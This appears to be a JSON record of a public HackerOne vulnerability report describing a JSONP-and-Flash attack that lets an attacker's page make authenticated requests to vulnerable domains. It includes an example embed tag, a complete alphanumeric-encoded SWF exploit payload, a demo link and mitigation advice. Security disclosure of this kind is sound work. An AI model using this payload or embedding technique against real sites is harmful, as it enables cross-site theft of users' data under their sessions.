    "vulnerability_information": "Overview\n========\n\nThis is a new type of web vulnerability that is made possible by two seemingly unrelated things:\n\n- the way JSONP APIs work\n- the way Flash handles malformed SWF files\n\nand has an effect and limitations similar to XSS flaws:\n\n- the user has to visit a website set up by the attacker in order to trigger the vulnerability\n- as a result, the attacker can make arbitrary HTTP request to the vulnerable domain (with the user's cookies sent along with the request) and read the responses\n\nDescription\n===========\n\n[JSONP] APIs return JSON data wrapped by an invocation of a callback function specified by the caller.  The caller first defines a JavaScript function and then injects a script tag with the JSON API URL as if it were a JavaScript file to load. JSONP APIs became popular because making JSONP requests are is not forbidden by the Same Origin Policy.\n\nFrom the point of view of this discussion, the important part is that **the first bytes of the response can be controlled by a GET parameter** (typically named callback).\n\nIf an attacker can create a Flash file, that can be passed as callback parameter to a JSONP API, and passes the filters applied to the callback name, then she is able to load this Flash file in the security context of the JSONP API's domain (the target domain). After the Flash file is loaded, she can make HTTP requests through it to the target domain in the name of the user.\n\nExample:\n\n    <object type=\"application/x-shockwave-flash\"\n            data=\"http://example.com/jsonp-api?callback=__URL_ENCODED_SWF__\">\n      <param name=\"AllowScriptAccess\" value=\"always\">\n    </object>\n\nThe response to the HTTP request:\n\n    __SWF_FILE__({\"actual\": \"API\", \"response\": 15})\n\nThere is two significant problems that have to be solved by an attacker:\n\n 1. the end of the response is the actual JSON API response, and that makes the response as a whole an invalid SWF file.\n 2. callback names are almost always filtered, forcing the callback parameter into the [A-Za-z0-9] range\n\nThe first problem is in fact solved by the way **Flash** handles invalid SWF files: it **ignores additional bytes at the end of an otherwise valid Flash file**.\n\nThe second problem turns out to be solvable too. The SWF file format specifies a way to compress the whole file (except an 8 byte header) as a DEFLATE stream. **It is possible to create a DEFLATE stream in the [A-Za-z0-9] character range for arbitrary binary data.** (As proven by my [ascii-zip] project)\n\nAs a demonstration, I've created a Flash file in the given character range that can load an arbitrary SWF file given by the embedder site (the attacker website) into it's security context (the target domain's security context):\n\n    CWSA7000hCD0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtWGDtGDGwwwDDGDG0Gt0GDGwtGDG0sDttwwwDG33w0sDDt03G33333sDfBDIHTOHHoKHBhHZLxHHHrlbhHHtHRHXXHHHdHDuYAENjmENDaqfvjmENyDjmENJYYfmLzMENYQfaFQENYnfVNx1D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwwEDG3w0sG0stDDGtw0GDDwwwt3wt333333w03333gFPaEIQSNvTnmAqICTcsacSCtiUAcYVsSyUcliUAcYVIkSICMAULiUAcYVq9D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7CiudIbEAtwwuG333swG033GDtpDtDtDGDD33333s03333sdFPOwWgotOOOOOOOwodFhfhFtFLFlHLTXXTXxT8D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUU7kiudIbEAt33swwEGDDtDG0GGDDwwwDt0wDGwwGG0sDDt033333GDt333swwv3sFPDtdtthLtDdthTthxthXXHHHHhHHHHHHhHXhHHHHXhXhXHXhHhiOUOsxCxHwWhsXKTgtSXhsDCDHshghSLhmHHhDXHhEOUoZQHHshghoeXehMdXwSlhsXkhehMdhwSXhXmHH5D0Up0IZUnnnnnnnnnnnnnnnnnnnUU5nnnnnn3SUUnUUUwGNqdIbe133333333333333333sUUef03gfzA8880HUAH\n\nThe embedder site can specify the SWF to load through the \"name\" property of the object tag. The specified SWF file could be a [cross domain proxy] that can make HTTP requests for the embedder site.\n\nRelated work\n============\n\nThis attack is inspired by Alok Menghrajani's [related work], where he showed that it is possible to assemble a Flash file in the [\\x01-\\0x7F] byte range to prove that certain JSONP endpoints are not secure.\n\nThe real contribution of my work is the demonstration of the fact that this attack is also feasible in the [A-Za-z0-9] character range. This is critical because overwhelming majority of the JSONP endpoints only accept this character range in the callback name.\n\nMitigation\n==========\n\nLimiting the callback name length is not a good solution, as there is no strong guarantee that it is not possible to come up with an SWF file that conforms to this tightened filter.\n\nThe API maintainer can mitigate this type of attack by **putting an empty JavaScript callback in front of the callback name in the repsonse**. This makes it impossible to control the first bytes of the response.\n\nAn other protection would be **hosting JSONP APIs on a sandbox domain**. The latter solution is only effective if there's no crossdomain.xml rule that would allow requests from the sandbox domain to the main domain.\n\nA proper solution would be **changing the way Flash handles malformed SWF files so that it won't files with additional data at the end of the SWF file**.\n\nAlthough one of the mitigations is fixing Flash, I don't consider this a Flash vulnerability, as an affected site does not even have to use the Flash technology in order to be vulnerable.\n\nAffected sites\n==============\n\nI've tested the 35 top websites on Wikipedia's (somewhat out of date) copy of the Alexa [toplist](http://en.wikipedia.org/wiki/List_of_most_popular_websites) (after unifying www.google.* domains into a single entry), and 16 (~45%) of them proved to be vulnerable.\n\nThe unaffected sites fall into the following categories:\n- Sites that simply don't have any JSONP API.\n- Google and Facebook: JSONP answers from these sites begin with empty JavaScript comments (probably because they are being extremely cautious and implemented this protection after the publication of Alok Menghrajani's [related work]).\n- Sites that host all JSONP APIs on a different domain (this is considered as a best practice) and don't have crossdomain.xml rule on the main site that enables cross domain requests from the API domain.\n- A single site limits the callback name length to 50 characters.\n\n[DEMO](https://gabor.molnar.es/bb/9bfb0835d1e72705bb374132c4d2cb3e9a4417e91b9be31a074fb7d644b34988/octameter.html)\n=======\n\nJSONP: http://json-p.org/\nascii-zip: https://github.com/molnarg/ascii-zip\ncross domain proxy: https://github.com/borisreitman/CrossXHR\nrelated work: http://quaxio.com/jsonp_handcrafted_flash_files/\ntoplist: http://en.wikipedia.org/wiki/List_of_most_popular_websites\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "", 
            "about": "Hack all the things.", 
            "twitter_handle": null, 
            "name": "The Internet"
        }, 
        "handle": "internet", 
        "url": "https://hackerone.com/internet", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/020/b94983d2ec09553c3e08f98cc718cb17e01112e6_small.png?1383767658", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/38e952fcff2c0aae0d011d5cecd07e5f62ecbd63_medium.png?1383767658"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 20, 
        "default_currency": "usd"
    }, 
    "is_published": false
}